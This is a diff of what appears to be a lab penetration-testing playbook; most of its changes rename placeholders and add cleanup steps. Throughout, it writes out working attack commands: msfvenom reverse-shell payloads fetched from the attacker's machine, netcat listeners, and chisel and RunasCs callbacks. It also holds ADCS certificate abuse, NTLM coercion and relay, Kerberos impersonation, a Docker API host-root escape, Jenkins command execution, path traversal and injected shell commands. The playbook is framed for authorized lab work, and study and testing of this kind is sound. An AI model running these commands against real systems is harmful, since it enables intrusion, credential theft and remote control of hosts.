@@ -54,14 +54,14 @@ Sources SHA-256: `ecec4118a4af2cf2dc8f29b82712febe898620d82e82079be85ef91df4a5a7
 
 # network
 
-Run from Kali. Replace `<IP_ADDRESS>` with the assigned box.
+Run from Kali. Replace `<TARGET_IP>` with the assigned box.
 
 ## NET-01. Check connectivity
 
 Enter when: you have a fresh assigned target.
 
 ```bash
-ping -c 3 '<IP_ADDRESS>'
+ping -c 3 '<TARGET_IP>'
 ```
 
 | Result | Next |
@@ -75,10 +75,10 @@ ping -c 3 '<IP_ADDRESS>'
 Enter when: the box responds, or you have decided to scan anyway.
 
 ```bash
-sudo nmap -sC -sV -p- -v -T4 -oN results.txt '<IP_ADDRESS>'
+sudo nmap -sC -sV -p- -v -T4 -oN results.txt '<TARGET_IP>'
 ```
 
-If sudo is unavailable, use `nmap -sT -sC -sV -p- -v -T4 -oN results.txt '<IP_ADDRESS>'`. If discovery wrongly reports the host down, retry once with `-Pn`.
+If sudo is unavailable, use `nmap -sT -sC -sV -p- -v -T4 -oN results.txt '<TARGET_IP>'`. If discovery wrongly reports the host down, retry once with `-Pn`.
 
 | Result | Next |
 | --- | --- |
@@ -92,7 +92,7 @@ If sudo is unavailable, use `nmap -sT -sC -sV -p- -v -T4 -oN results.txt '<IP_AD
 Enter when: one open port's service identity is genuinely unclear.
 
 ```bash
-nmap -sV -p '<OBSERVED_TCP_PORT>' '<IP_ADDRESS>'
+nmap -sV -p '<PORT>' '<TARGET_IP>'
 ```
 
 Add `-Pn` only if discovery gets in the way. Use the protocol's own reply when you can; a version guess is a lead, not a vulnerability.
@@ -107,7 +107,7 @@ Add `-Pn` only if discovery gets in the way. Use the protocol's own reply when y
 Enter when: a TCP clue justifies UDP, e.g. a `smux` or `rpcbind` listener.
 
 ```bash
-sudo nmap -sU -p 1-1024 -v -oN results.txt '<IP_ADDRESS>'
+sudo nmap -sU -p 1-1024 -v -oN results.txt '<TARGET_IP>'
 ```
 
 This covers the top 1024 ports, not all UDP. `open|filtered` is unresolved, not open.
@@ -353,7 +353,7 @@ A scanner string is a hint, not a confirmed version.
 Enter when: a real GET request and its normal value are captured.
 
 ```bash
-curl -sS -i --get '<TARGET_URL>' --data-urlencode '<PARAM>=<BENIGN_VALUE>'
+curl -sS -i --get '<TARGET_URL>' --data-urlencode '<FIELD>=<BENIGN_VALUE>'
 ```
 
 Compare status, body and redirect with the normal value.
@@ -853,11 +853,11 @@ Enter after WIN-13 matches. Hash the source before and after any edit, build to 
 
 ```bash
 sha256sum -- '<ORIGINAL>' '<DERIVATIVE>'
-python3 -m http.server <PORT> --bind <LHOST> --directory '<BUILD_DIR>'
+python3 -m http.server <PORT> --bind <KALI_IP> --directory '<BUILD_DIR>'
 ```
 
 ```powershell
-Invoke-WebRequest 'http://<LHOST>:<PORT>/<FILE>' -OutFile '<STAGE>' -ErrorAction Stop
+Invoke-WebRequest 'http://<KALI_IP>:<PORT>/<FILE>' -OutFile '<STAGE>' -ErrorAction Stop
 (Get-FileHash -LiteralPath '<STAGE>' -Algorithm SHA256).Hash
 ```
 
@@ -889,14 +889,14 @@ if (Test-Path -LiteralPath '<BACKUP>') { throw 'exists' }
 Stage a payload, start a listener, replace, then trigger:
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST='<LHOST>' LPORT='<PORT>' -f exe -o payload.exe
-python3 -m http.server '<HTTP_PORT>' --bind '<LHOST>'
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<PORT>' -f exe -o payload.exe
+python3 -m http.server '<HTTP_PORT>' --bind '<KALI_IP>'
 # second terminal, before the trigger
 nc -lvnp '<PORT>'
 ```
 
 ```powershell
-Invoke-WebRequest 'http://<LHOST>:<HTTP_PORT>/payload.exe' -OutFile '<STAGE>'
+Invoke-WebRequest 'http://<KALI_IP>:<HTTP_PORT>/payload.exe' -OutFile '<STAGE>'
 ```
 
 ```powershell
@@ -1051,7 +1051,7 @@ nxc ldap <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --gmsa
 ```powershell
 Get-GPO -Name '<GPO_NAME>'
 Backup-GPO -Name '<GPO_NAME>' -Path '<NEW_BACKUP_DIR>'
-& '<SHARPGPOABUSE>' --AddLocalAdmin --UserAccount '<USER>' --GPOName '<GPO_NAME>'
+& '<SHARPGPOABUSE>' --AddLocalAdmin --UserAccount '<USERNAME>' --GPOName '<GPO_NAME>'
 gpupdate.exe /force; net localgroup administrators
 Restore-GPO -Name '<GPO_NAME>' -Path '<NEW_BACKUP_DIR>'
 ```
@@ -1088,7 +1088,7 @@ Trigger Windows+U at the RDP logon screen, run `hostname; whoami /all`, then res
 
 ```text
 rlwrap nc -lvnp <LPORT>
-& '<RUNASCS>' '<USERNAME>' '<PASSWORD>' cmd.exe -d '<DOMAIN>' -r '<LHOST>:<LPORT>'
+& '<RUNASCS>' '<USERNAME>' '<PASSWORD>' cmd.exe -d '<DOMAIN>' -r '<KALI_IP>:<LPORT>'
 ```
 
 Drop `-d '<DOMAIN>'` for a local account. Verify with `whoami /all`.
@@ -1141,7 +1141,7 @@ Password path instead: `bloodyAD ... set password '<TARGET_USER>' '<NEW_PASSWORD
 
 ```powershell
 Get-NetTCPConnection -State Listen | Where-Object { $_.LocalAddress -eq '127.0.0.1' } | Select-Object LocalPort, OwningProcess
-& '<CHISEL>' 'client' 'http://<LHOST>:<PORT>' 'R:127.0.0.1:<LOCAL_PORT>:127.0.0.1:<REMOTE_PORT>'
+& '<CHISEL>' 'client' 'http://<KALI_IP>:<PORT>' 'R:127.0.0.1:<LOCAL_PORT>:127.0.0.1:<REMOTE_PORT>'
 ```
 
 On Kali: `chisel server --reverse --port '<PORT>'`, then `nmap -sT -Pn -p '<LOCAL_PORT>' 127.0.0.1`. Stop both processes after the check.
@@ -1176,7 +1176,7 @@ ADCS is a certificate-service path on the domain controller. Use only on an auth
 ## ADCS-01. Is a CA reachable and which templates are vulnerable?
 
 ```bash
-certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip '<DC_IP>' -vulnerable -stdout
+certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout
 ```
 
 Read the CA name, template names, enrolment rights and the reported ESC classes. A flagged template still needs its rights and input requirements to match.
@@ -1192,7 +1192,7 @@ Read the CA name, template names, enrolment rights and the reported ESC classes.
 ## ADCS-02. Can one certificate be issued for a higher principal?
 
 ```bash
-certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip '<DC_IP>'
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip '<DC_IP>'
 ```
 
 A returned `.pfx` is issued material, not a session.
@@ -1202,6 +1202,8 @@ A returned `.pfx` is issued material, not a session.
 | `.pfx` written | **ADCS-03**. |
 | Request denied or template mismatch | **ADCS-01** with the exact reason. |
 | CA or DC unreachable | **PAUSE-ROUTE**. |
+
+The request leaves a `.pfx`; delete it after authentication if unused: `rm -i administrator.pfx`.
 
 ## ADCS-03. Does the certificate authenticate as that principal?
 
@@ -1217,11 +1219,13 @@ This returns a TGT and, for a DC-issued cert, often the account's NT hash.
 | Auth fails | **ADCS-01**; check UPN, template and issuance time. |
 | Clock or DC mismatch | **PAUSE-ROUTE**. |
 
+Remove the issued material when done: `rm -i administrator.pfx administrator.ccache`.
+
 ## ADCS-04. Is web enrolment exposed?
 
 ```bash
 curl -sS -i 'http://<CA_HOST>/certsrv/'
-certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip '<DC_IP>' -stdout | Select-String 'Web Enrollment'
+certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout | grep -i 'web enrollment'
 ```
 
 An exposed `/certsrv` with NTLM auth is the ESC8 precondition.
@@ -1246,8 +1250,8 @@ responder -I '<IFACE>' -A
 Then coerce one target:
 
 ```bash
-python3 PetitPotam.py -d '<DOMAIN>' -u '<USER>' -p '<PASS>' '<KALI_IP>' '<TARGET_IP>'
-python3 printerbug.py '<DOMAIN>/<USER>:<PASS>@<TARGET_IP>' '<KALI_IP>'
+python3 PetitPotam.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' '<KALI_IP>' '<TARGET_IP>'
+python3 printerbug.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>' '<KALI_IP>'
 ```
 
 A captured NetNTLMv2 hash proves coercion.
@@ -1258,6 +1262,8 @@ A captured NetNTLMv2 hash proves coercion.
 | Capture passively before coercing | **RELAY-01**. |
 | No authentication arrives | Check the interface and target service; **PAUSE-COVERAGE**. |
 | RPC denied | **AD-03** on another host. |
+
+Stop the capture with Ctrl-C after one attempt.
 
 ## RELAY-01. Can NetNTLM be captured without coercion?
 
@@ -1272,15 +1278,23 @@ Leave it running while normal traffic and a coerce run. `-A` analyses instead of
 | NetNTLMv2 from a user or machine | **PASS-02** or **RELAY-02**. |
 | Nothing in the window | **COERCE-01** for a deliberate trigger. |
 
+Stop the capture with Ctrl-C when the window closes.
+
 ## RELAY-02. Can the authentication be relayed?
 
 SMB signing must be off on the target. Relay to LDAP for a machine account and RBCD:
 
 ```bash
-ntlmrelayx.py -t ldaps://'<DC_IP>' -smb2support --delegate-access --escalate-user '<CONTROLLED_COMPUTER>$'
+ntlmrelayx.py -t ldaps://'<DC_IP>' -smb2support --delegate-access
 ```
 
-Run **COERCE-01** against a target in the same window, then read the created delegation.
+Use `--delegate-access` to create a new machine account and grant it RBCD, or this form to escalate an existing controlled computer:
+
+```bash
+ntlmrelayx.py -t ldaps://'<DC_IP>' -smb2support --escalate-user '<CONTROLLED_COMPUTER>$'
+```
+
+Run **COERCE-01** against a target in the same window, then read the delegation. Stop the relay with Ctrl-C.
 
 | Result | Next |
 | --- | --- |
@@ -1292,7 +1306,8 @@ Run **COERCE-01** against a target in the same window, then read the created del
 ## DELEG-01. Which delegation rights exist?
 
 ```bash
-ldapsearch -x -H 'ldap://<DC_IP>' -D '<USER>@<DOMAIN>' -w '<PASS>' -b '<BASE_DN>' \
+impacket-findDelegation '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip '<DC_IP>'
+ldapsearch -x -H 'ldap://<DC_IP>' -D '<USERNAME>@<DOMAIN>' -w '<PASSWORD>' -b '<BASE_DN>' \
   '(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(msDS-AllowedToDelegateTo=*))' \
   sAMAccountName userAccountControl msDS-AllowedToDelegateTo
 ```
@@ -1310,7 +1325,9 @@ Bit 524288 is unconstrained; `msDS-AllowedToDelegateTo` is constrained.
 With protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`) and a service secret:
 
 ```bash
-impacket-getST -spn '<TARGET_SPN>' -impersonate administrator -dc-ip '<DC_IP>' '<DOMAIN>/<SVC_ACCOUNT>':'<PASS>'
+impacket-getST -spn '<TARGET_SPN>' -impersonate administrator -dc-ip '<DC_IP>' '<DOMAIN>/<SVC_ACCOUNT>:<PASSWORD>'
+# or with the service NT hash
+impacket-getST -spn '<TARGET_SPN>' -impersonate administrator -dc-ip '<DC_IP>' -hashes ':<NTLM_HASH>' '<DOMAIN>/<SVC_ACCOUNT>'
 KRB5CCNAME='administrator.ccache' impacket-psexec -k -no-pass '<DOMAIN>/administrator@<TARGET_HOST>'
 ```
 
@@ -1352,7 +1369,7 @@ Spray and crack one credential source at a time.
 Read the lockout policy before spraying:
 
 ```bash
-nxc smb '<DC_IP>' -u '<USER>' -p '<PASS>' --pass-pol
+nxc smb '<DC_IP>' -u '<USERNAME>' -p '<PASSWORD>' --pass-pol
 ```
 
 Then try one password against the user list, stopping on the first success per account:
@@ -1381,6 +1398,8 @@ hashcat -m 5600 '<NETNTLMv2_HASH>' /usr/share/wordlists/rockyou.txt
 | --- | --- |
 | Plaintext recovered | **AD-03** for one host, or **WIN-10** for a process switch. |
 | Not in rockyou | Record it; **PAUSE-COVERAGE** or a selected rule set. |
+
+`--show` lists recovered values; delete the hash file when done.
 | Wrong mode | **hashid** output again; do not try every mode. |
 | NTLM used directly | Pass-the-hash at **AD-03** with `-H`. |
 # redis
@@ -1391,7 +1410,7 @@ hashcat -m 5600 '<NETNTLMv2_HASH>' /usr/share/wordlists/rockyou.txt
 redis-cli -h '<TARGET_IP>' -p <PORT> PING
 ```
 
-With a supplied password, use `--askpass`; add `--user '<USER>'` for an ACL user.
+With a supplied password, use `--askpass`; add `--user '<USERNAME>'` for an ACL user.
 
 | Result | Next |
 | --- | --- |
@@ -1537,7 +1556,7 @@ SAVE
 ```
 
 ```bash
-curl -sS --get 'http://<TARGET>/<LFI_ENDPOINT>' --data-urlencode '<FILE_PARAM>=<WEB_WRITABLE_DIR>/owb-user-<ID>.rdb' --data-urlencode 'owb_cmd=id'
+curl -sS --get 'http://<TARGET_IP>/<LFI_ENDPOINT>' --data-urlencode '<FILE_PARAM>=<WEB_WRITABLE_DIR>/owb-user-<ID>.rdb' --data-urlencode 'owb_cmd=id'
 ```
 
 | Result | Next |
@@ -1590,18 +1609,18 @@ Disposable lab with a reset. WIN-01 must confirm host and architecture, WIN-07 b
 ## WPRIV-01. Does the enabled installer policy yield the intended Windows token?
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST='<LHOST>' LPORT='<LPORT>' -f msi -o proof.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f msi -o proof.msi
 sha256sum proof.msi
-python3 -m http.server '<HTTP_PORT>' --bind '<LHOST>'
+python3 -m http.server '<HTTP_PORT>' --bind '<KALI_IP>'
 ```
 
 ```powershell
 New-Item -ItemType Directory -Path 'C:\Users\Public\owb-msi' -ErrorAction Stop
-Invoke-WebRequest -Uri 'http://<LHOST>:<HTTP_PORT>/proof.msi' -OutFile 'C:\Users\Public\owb-msi\proof.msi'
+Invoke-WebRequest -Uri 'http://<KALI_IP>:<HTTP_PORT>/proof.msi' -OutFile 'C:\Users\Public\owb-msi\proof.msi'
 (Get-FileHash -LiteralPath 'C:\Users\Public\owb-msi\proof.msi' -Algorithm SHA256).Hash
 ```
 
-Start `ncat --listen '<LHOST>' '<LPORT>'` in a second terminal, then install:
+Start `ncat --listen '<KALI_IP>' '<LPORT>'` in a second terminal, then install:
 
 ```powershell
 msiexec.exe /i 'C:\Users\Public\owb-msi\proof.msi' /qn /norestart
@@ -1749,26 +1768,26 @@ agent's own port. Reads only, no `snmpset`.
 Scan the one port:
 
 ```bash
-sudo nmap -sU -p 161 -sV <TARGET>
+sudo nmap -sU -p 161 -sV <TARGET_IP>
 ```
 
 Test the two common communities against one scalar:
 
 ```bash
-snmpget -v1 -c public -t 3 -r 0 -On <TARGET> 1.3.6.1.2.1.1.1.0
-snmpget -v1 -c private -t 3 -r 0 -On <TARGET> 1.3.6.1.2.1.1.1.0
+snmpget -v1 -c public -t 3 -r 0 -On <TARGET_IP> 1.3.6.1.2.1.1.1.0
+snmpget -v1 -c private -t 3 -r 0 -On <TARGET_IP> 1.3.6.1.2.1.1.1.0
 ```
 
 Or let a list try them:
 
 ```bash
-onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET>
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP>
 ```
 
 If a v3 user was supplied, use it instead:
 
 ```bash
-snmpget -v3 -l authPriv -u <USER> -a SHA -A '<AUTH_PASS>' -x AES -X '<PRIV_PASS>' <TARGET> 1.3.6.1.2.1.1.1.0
+snmpget -v3 -l authPriv -u <USERNAME> -a SHA -A '<AUTH_PASS>' -x AES -X '<PRIV_PASS>' <TARGET_IP> 1.3.6.1.2.1.1.1.0
 ```
 
 | Result | Next action |
@@ -1785,7 +1804,7 @@ snmpget -v3 -l authPriv -u <USER> -a SHA -A '<AUTH_PASS>' -x AES -X '<PRIV_PASS>
 Dump the tree once and work from the file:
 
 ```bash
-snmpwalk -v1 -c <COMMUNITY> -On <TARGET> > snmp.txt
+snmpwalk -v1 -c <COMMUNITY> -On <TARGET_IP> > snmp.txt
 wc -l snmp.txt
 ```
 
@@ -1824,8 +1843,8 @@ Confirm the engine from its response before picking a client. One supplied ident
 Non-TLS lab only:
 
 ```bash
-PGHOSTADDR='<TARGET_IP>' PGSSLMODE=disable PGCONNECT_TIMEOUT=5 psql -X -W --host '<TARGET_IP>' --port '<PORT>' --username '<USER>' --dbname '<DB>'
-mariadb --no-defaults --protocol=tcp --connect-timeout=5 --host='<TARGET_IP>' --port='<PORT>' --user='<USER>' --password --disable-ssl
+PGHOSTADDR='<TARGET_IP>' PGSSLMODE=disable PGCONNECT_TIMEOUT=5 psql -X -W --host '<TARGET_IP>' --port '<PORT>' --username '<USERNAME>' --dbname '<DB>'
+mariadb --no-defaults --protocol=tcp --connect-timeout=5 --host='<TARGET_IP>' --port='<PORT>' --user='<USERNAME>' --password --disable-ssl
 ```
 
 For verified TLS use `PGSSLMODE=verify-full PGSSLROOTCERT='<CA>'` and the certificate hostname, or `--ssl --ssl-ca='<CA>' --ssl-verify-server-cert`. Do not fall back to plaintext after a trust failure.
@@ -2096,8 +2115,8 @@ Service-specific paths that NET-05 can select.
 ## SMTP-01. Can users be enumerated or mail relayed?
 
 ```bash
-smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t '<TARGET>'
-swaks --to 'test@example.com' --from 'a@example.com' --server '<TARGET>' --body 'relay'
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t '<TARGET_IP>'
+swaks --to 'test@example.com' --from 'a@example.com' --server '<TARGET_IP>' --body 'relay'
 ```
 
 Send to an external address to test relay. `250` after `RCPT` is acceptance, not delivery.
@@ -2112,8 +2131,8 @@ Send to an external address to test relay. `250` after `RCPT` is acceptance, not
 ## TFTP-01. Can a file be read?
 
 ```bash
-nmap -sU -p 69 --script tftp-enum '<TARGET>'
-tftp '<TARGET>'
+nmap -sU -p 69 --script tftp-enum '<TARGET_IP>'
+tftp '<TARGET_IP>'
 ```
 
 At the prompt: `binary`, `get <FILE>`, `quit`.
@@ -2127,44 +2146,53 @@ At the prompt: `binary`, `get <FILE>`, `quit`.
 ## RSYNC-01. Is a module exposed?
 
 ```bash
-nc -nv '<TARGET>' 873
-rsync rsync://'<TARGET>'/
-rsync -av 'rsync://<TARGET>/<MODULE>' ./rsync-copy/
+nc -nv '<TARGET_IP>' 873
+rsync rsync://'<TARGET_IP>'/
+rsync -av 'rsync://<TARGET_IP>/<MODULE>' ./rsync-copy/
 ```
 
 | Result | Next |
 | --- | --- |
 | Module list | Read one module with `rsync -av`. |
 | Files retrieved | **ART-01** on a selected file. |
+
+Delete the local copy after triage.
 | Connection refused | **NET-03**. |
 
 ## DOCKER-01. Is the Docker API unauthenticated?
 
 ```bash
-curl -sS 'http://<TARGET>:2375/version'
-curl -sS 'http://<TARGET>:2375/containers/json'
+curl -sS 'http://<TARGET_IP>:2375/version'
+curl -sS 'http://<TARGET_IP>:2375/containers/json'
 ```
 
 Create a privileged container that mounts the host:
 
 ```bash
-curl -sS -X POST -H 'Content-Type: application/json' 'http://<TARGET>:2375/containers/create?name=owb' \
+curl -sS -X POST -H 'Content-Type: application/json' 'http://<TARGET_IP>:2375/containers/create?name=owb' \
   -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host /bin/sh -c id"],"HostConfig":{"Binds":["/:/host"]}}'
-curl -sS -X POST 'http://<TARGET>:2375/containers/owb/start'
-curl -sS 'http://<TARGET>:2375/containers/owb/logs?stdout=1'
+curl -sS -X POST 'http://<TARGET_IP>:2375/containers/owb/start'
+curl -sS 'http://<TARGET_IP>:2375/containers/owb/logs?stdout=1'
 ```
 
 | Result | Next |
 | --- | --- |
 | `uid=0` from the host | Host root; **LNX-01** for context. |
 | 403 or 401 | **PAUSE-COVERAGE**. |
-| Image missing | `{"Image":"<existing image>"}` from `/images/json`. |
+| Image missing | `{"Image":"<EXISTING_IMAGE>"}` from `/images/json`. |
+
+Stop and remove the container:
+
+```bash
+curl -sS -X POST 'http://<TARGET_IP>:2375/containers/owb/stop'
+curl -sS -X DELETE 'http://<TARGET_IP>:2375/containers/owb?force=1'
+```
 
 ## JENKINS-01. Is the script console open?
 
 ```bash
-curl -sS -i 'http://<TARGET>:<PORT>/script'
-curl -sS -i 'http://<TARGET>:<PORT>/asynchPeople/'
+curl -sS -i 'http://<TARGET_IP>:<PORT>/script'
+curl -sS -i 'http://<TARGET_IP>:<PORT>/asynchPeople/'
 ```
 
 In the script console Groovy:
@@ -2182,8 +2210,8 @@ println "id".execute().text
 ## IPMI-01. Is the BMC reachable on UDP 623?
 
 ```bash
-sudo nmap -sU -p 623 --script ipmi-version '<TARGET>'
-ipmitool -I lanplus -H '<TARGET>' -U ADMIN -P ADMIN chassis status
+sudo nmap -sU -p 623 --script ipmi-version '<TARGET_IP>'
+ipmitool -I lanplus -H '<TARGET_IP>' -U ADMIN -P ADMIN chassis status
 ```
 
 | Result | Next |
@@ -2191,6 +2219,8 @@ ipmitool -I lanplus -H '<TARGET>' -U ADMIN -P ADMIN chassis status
 | Version output | Try the default credential once; record the hash if prompted. |
 | Hash captured | **PASS-02** with mode 7300. |
 | Silent | **NET-04**. |
+
+Mode 7300 is IPMI2 RAKP HMAC-SHA1.
 # web_input
 
 Start from the working request at WEB-06/08. Form stays POST: repeat every required field and a fresh CSRF value. For an existing session add `--header '@<HEADERS>'` only on the same origin.
@@ -2200,8 +2230,8 @@ Start from the working request at WEB-06/08. Form stays POST: repeat every requi
 Enter when the feature actually reads a named file.
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<ORDINARY_FILE>' -o baseline.body -w 'HTTP %{http_code}\n' '<URL>'
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=../../../../etc/passwd' -o probe.body -w 'HTTP %{http_code}\n' '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<FIELD>=<ORDINARY_FILE>' -o baseline.body -w 'HTTP %{http_code}\n' '<TARGET_URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<FIELD>=../../../../etc/passwd' -o probe.body -w 'HTTP %{http_code}\n' '<TARGET_URL>'
 sed -n '1,40p' probe.body | cat -v
 ```
 
@@ -2219,9 +2249,9 @@ For Windows handling use `..\..\..\..\Windows\win.ini`.
 Enter when an ordinary value works and the argument looks unquoted.
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE>; printf OWB_%s <NONCE>' -o probe.body -w 'HTTP %{http_code}\n' '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<FIELD>=<BENIGN_VALUE>; printf OWB_%s <NONCE>' -o probe.body -w 'HTTP %{http_code}\n' '<TARGET_URL>'
 grep -F 'OWB_<NONCE>' probe.body
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE>; id' -o verify.body -w 'HTTP %{http_code}\n' '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<FIELD>=<BENIGN_VALUE>; id' -o verify.body -w 'HTTP %{http_code}\n' '<TARGET_URL>'
 ```
 
 `;` rejected: retry once with a literal newline (`--data-urlencode $'...\nprintf OWB_%s <NONCE>'`).
@@ -2236,8 +2266,8 @@ curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --
 ## WSQL-01. Does a numeric read-only query respond to Boolean SQL logic?
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<ID> AND 1=1' -o true.body -w 'HTTP %{http_code}\n' '<URL>'
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<ID> AND 1=2' -o false.body -w 'HTTP %{http_code}\n' '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<FIELD>=<ID> AND 1=1' -o true.body -w 'HTTP %{http_code}\n' '<TARGET_URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<FIELD>=<ID> AND 1=2' -o false.body -w 'HTTP %{http_code}\n' '<TARGET_URL>'
 ```
 
 Ordinary and true must match, false must differ.
@@ -2255,7 +2285,7 @@ Ordinary and true must match, false must differ.
 Enter only with a create request, a retrieval view and a known delete route.
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --request POST --data-urlencode '<field>=OWB_STORE_<NONCE>' -o create.body -w 'HTTP %{http_code}\n' '<CREATE_URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --request POST --data-urlencode '<FIELD>=OWB_STORE_<NONCE>' -o create.body -w 'HTTP %{http_code}\n' '<CREATE_URL>'
 curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 -o view.body '<VIEW_URL>'
 grep -F 'OWB_STORE_<NONCE>' view.body
 ```
@@ -2274,9 +2304,9 @@ Then use the observed delete/reset route and re-read the view; the marker must b
 ## FTP-03. Does one observed FTP write path accept and remove an inert file?
 
 ```bash
-printf 'probe\n' | curl --disable --globoff -sS --fail --user '<USER>' --upload-file - 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
-curl --disable --globoff -sS --fail --user '<USER>' -o probe.copy 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
-curl --disable --globoff --list-only -sS --fail --user '<USER>' --quote '+DELE probe-<ID>.txt' 'ftp://<TARGET_IP>:<PORT>/<DIR>/'
+printf 'probe\n' | curl --disable --globoff -sS --fail --user '<USERNAME>' --upload-file - 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
+curl --disable --globoff -sS --fail --user '<USERNAME>' -o probe.copy 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
+curl --disable --globoff --list-only -sS --fail --user '<USERNAME>' --quote '+DELE probe-<ID>.txt' 'ftp://<TARGET_IP>:<PORT>/<DIR>/'
 rm probe.copy
 ```
 
@@ -2294,7 +2324,7 @@ rm probe.copy
 Implicit FTPS:
 
 ```bash
-curl --disable --globoff --path-as-is -sS --fail --ftp-pasv --cacert '<CA>' --resolve '<CERT_HOST>:<PORT>:<TARGET_IP>' --user '<USER>' -w 'TLS %{ssl_verify_result}\n' 'ftps://<CERT_HOST>:<PORT>/<DIR>/'
+curl --disable --globoff --path-as-is -sS --fail --ftp-pasv --cacert '<CA>' --resolve '<CERT_HOST>:<PORT>:<TARGET_IP>' --user '<USERNAME>' -w 'TLS %{ssl_verify_result}\n' 'ftps://<CERT_HOST>:<PORT>/<DIR>/'
 ```
 
 For STARTTLS use `--ssl-reqd` and `ftp://`.
@@ -2342,13 +2372,13 @@ Enter only with known quoting and a safe original command. GET shown; for a form
 Single-quoted argument:
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>'; printf OWB_%s <NONCE> #" -o probe.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<FIELD>=<BENIGN_VALUE>'; printf OWB_%s <NONCE> #" -o probe.body '<TARGET_URL>'
 ```
 
-Double-quoted argument uses `'<field>=<VALUE>"; printf OWB_%s <NONCE> #'` instead. Then verify identity:
+Double-quoted argument uses `'<FIELD>=<BENIGN_VALUE>"; printf OWB_%s <NONCE> #'` instead. Then verify identity:
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>'; id; uname -s #" -o verify.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<FIELD>=<BENIGN_VALUE>'; id; uname -s #" -o verify.body '<TARGET_URL>'
 sed -n '1,60p' verify.body | cat -v
 ```
 
@@ -2363,13 +2393,13 @@ sed -n '1,60p' verify.body | cat -v
 Unquoted:
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE> & set /a 73190+7 & rem ' -o probe.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<FIELD>=<BENIGN_VALUE> & set /a 73190+7 & rem ' -o probe.body '<TARGET_URL>'
 ```
 
-Double-quoted uses `'<field>=<VALUE>" & set /a 73190+7 & rem '`. Then:
+Double-quoted uses `'<FIELD>=<BENIGN_VALUE>" & set /a 73190+7 & rem '`. Then:
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE> & whoami & ver & rem ' -o verify.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<FIELD>=<BENIGN_VALUE> & whoami & ver & rem ' -o verify.body '<TARGET_URL>'
 sed -n '1,60p' verify.body | cat -v
 ```
 
@@ -2394,7 +2424,7 @@ ncat --listen --verbose --nodns '<KALI_IP>' '<PORT>'
 Then trigger:
 
 ```bash
